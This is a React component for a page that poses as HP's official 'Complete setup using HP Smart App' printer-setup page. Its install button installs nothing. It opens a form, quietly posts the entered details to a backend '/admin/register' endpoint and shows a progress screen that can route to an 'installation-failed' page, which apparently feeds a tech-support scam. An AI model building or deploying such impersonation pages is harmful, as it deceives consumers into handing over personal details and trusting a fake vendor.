import React, { useRef, useState } from 'react';
import { Helmet } from 'react-helmet-async';
import { useNavigate } from 'react-router-dom';
import FinalStep from './FinalStep';
import SetupProgressModal from './SetupProgressModal';

function CompleteSetup() {
  const navigate = useNavigate();
  const [showFinalStep, setShowFinalStep] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [showError, setShowError] = useState(false);
  const [loading, setLoading] = useState(false);
  const nameRef = useRef();
  const [userName, setUserName] = useState('');
  // Use local state for printerModel, initialize from localStorage
  const [printerModel, setPrinterModel] = useState(() => localStorage.getItem('printerModel') || '');

  const handleFinalSubmit = (e, form) => {
    e.preventDefault();
    setLoading(true);
    // Show progress modal and continue UI flow immediately
    const name = form.name?.trim() || nameRef.current?.value?.trim() || 'User';
    setUserName(name);
    setPrinterModel(form.model?.trim() || printerModel || 'Officejet');
    setShowFinalStep(false);
    setShowModal(true);
    setLoading(false);
    // Submit registration in background
    const backendUrl = import.meta.env.VITE_BACKEND_URL || 'http://localhost:4000';
    fetch(`${backendUrl}/admin/register`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(form)
    })
      .then(() => {})
      .catch(() => {});
  };

  // Get the issue value from localStorage
  const issue = localStorage.getItem('issue');

  // No longer needed: handleError

  if (showModal) {
    return <div className="fixed inset-0 z-50 bg-white flex items-center justify-center"><SetupProgressModal open={showModal} onClose={() => setShowModal(false)} user={userName} printer={printerModel} onError={() => navigate('/installation-failed')} /></div>;
  }

  return (
    <>
      <Helmet>
        <title>Complete Setup | HP Smart App</title>
      </Helmet>
      <div className="w-full min-h-screen bg-white flex flex-col">
        {/* Top blue section */}
        <section
          className="w-full min-h-[560px] flex items-start justify-center relative px-[6%]"
          style={{
            height: '560px',
            backgroundImage: 'url(/hero_background_image.jpg)',
            backgroundSize: 'cover',
            backgroundPosition: 'center',
          }}
        >
          <div className="w-full max-w-[1200px] flex flex-row items-start justify-between relative h-full">
            <div className="flex flex-col justify-center h-full w-full max-w-[700px] pt-8">
              <h1 className="text-white text-3xl md:text-4xl mb-8 leading-tight drop-shadow-lg">Complete setup using HP Smart App</h1>
              <p className="text-white text-lg md:text-xl mb-6 font-normal drop-shadow whitespace-normal">
                HP Smart App will connect the printer to your computer, install print drivers, and set up scanning features (if applicable)
              </p>
              <ol className="text-white text-lg mb-6 pl-6 list-decimal">
                <li className="mb-1">Make sure your printer is powered on</li>
                <li>Install HP Smart App to complete setup</li>
              </ol>
              <button
                className="bg-white text-blue-700 font-semibold px-7 py-3 rounded-full text-lg shadow hover:bg-blue-50 transition mb-6 w-fit"
                onClick={() => {
                  // Only show FinalStep if issue is exactly 'Set Up a New Printer'
                  if (issue && issue.trim() === 'Set Up a New Printer') {
                    setShowFinalStep(true);
                  } else {
                    setShowFinalStep(false);
                    setShowModal(true);
                  }
                }}
              >
                Install HP Smart App
              </button>
              <div className="bg-transparent text-white text-sm md:text-base mb-4">
                <span className="font-semibold">To use all available printer features</span>, you must install the HP Smart app on a mobile device or the latest version of Windows or macOS. Available on:
              </div>
              <div className="flex flex-row gap-3 mb-2">
                <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="App Store" className="h-10" />
                <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play" className="h-10" />
                <img src="https://get.microsoft.com/images/en-us%20dark.svg" alt="Microsoft Store" className="h-10 object-contain" />
              </div>
            </div>
            <div className="hidden md:flex flex-col items-center h-full absolute right-12 bottom-0 z-10">
              <div className="relative flex flex-col items-center">
                <img
                  src="/hp-printer-software.png"
                  alt="HP Printer Software"
                  className="h-[170px] w-auto max-w-none drop-shadow-xl"
                  style={{ marginTop: '200px' }}
                />

                <span className="absolute left-1/2 -translate-x-1/2 bottom-2 text-white text-xs font-normal drop-shadow bg-black/30 px-2 rounded whitespace-nowrap">
                  HP Printer Software
                </span>
              </div>
            </div>
          </div>
        </section>
        {/* Lower white section or FinalStep form */}
        {/* FinalStep as popup modal */}
        {showFinalStep && (
          <div className="fixed inset-0 z-50 bg-black bg-opacity-30 flex items-center justify-center">
            <div className="bg-white rounded-xl shadow-2xl w-full max-w-2xl p-8 mx-2 relative">
              <button onClick={() => setShowFinalStep(false)} className="absolute top-4 right-4 w-10 h-10 flex items-center justify-center rounded-full bg-gray-100 hover:bg-gray-300 text-gray-600 text-2xl z-10 shadow-md transition-all"><i className="fa-solid fa-xmark"></i></button>
              <FinalStep
                onBack={() => setShowFinalStep(false)}
                onSubmit={handleFinalSubmit}
                nameRef={nameRef}
                loading={loading}
                modelValue={printerModel}
                setModelValue={setPrinterModel}
              />
            </div>
          </div>
        )}
        {/* Lower white section */}
        <div className="w-full max-w-[1200px] mx-auto mt-16 px-3 md:px-0">
          <div className="flex flex-col w-full max-w-[900px]">
            <div className="flex md:flex-row flex-col md:items-center items-start mb-2 gap-2 md:gap-0">
              <i className="fa-solid fa-print text-blue-500 text-2xl md:mr-3 mr-0 mb-2 md:mb-0"></i>
              <h2 className=" md:text-xl text-lg font-semibold text-gray-800">Set up scanning from a control panel (if applicable):</h2>
            </div>
            <div className="text-gray-700 md:mb-4 mb-3 md:ml-9 ml-0 text-sm md:text-base">
              Set up additional scanning features (Windows only). Get started by selecting <span className="font-semibold">Install HP Smart App</span> above.<br />
              <span className="text-gray-500">Note: To scan from a macOS computer, install the HP Smart app.</span>
            </div>
            <div className="border-b border-gray-200 my-6" />
            <div className="flex md:flex-row flex-col md:items-center items-start mb-2 gap-2 md:gap-0">
              <i className="fa-solid fa-circle-question text-blue-500 text-2xl md:mr-3 mr-0 mb-2 md:mb-0"></i>
              <span className="text-gray-800 md:text-base text-sm">Need help troubleshooting during printer setup? <a href="#" className="text-blue-500 underline font-medium">Solve Setup Issues</a></span>
            </div>
            <div className="flex md:flex-row flex-col md:items-center items-start mb-2 gap-2 md:gap-0">
              <i className="fa-solid fa-circle-info text-blue-500 text-2xl md:mr-3 mr-0 mb-2 md:mb-0"></i>
              <span className="text-gray-800 md:text-base text-sm">Find additional setup information and videos <a href="#" className="text-blue-500 underline font-medium">Visit HP Support</a></span>
            </div>
          </div>
        </div>
      </div>

    </>
  );
}

export default CompleteSetup;
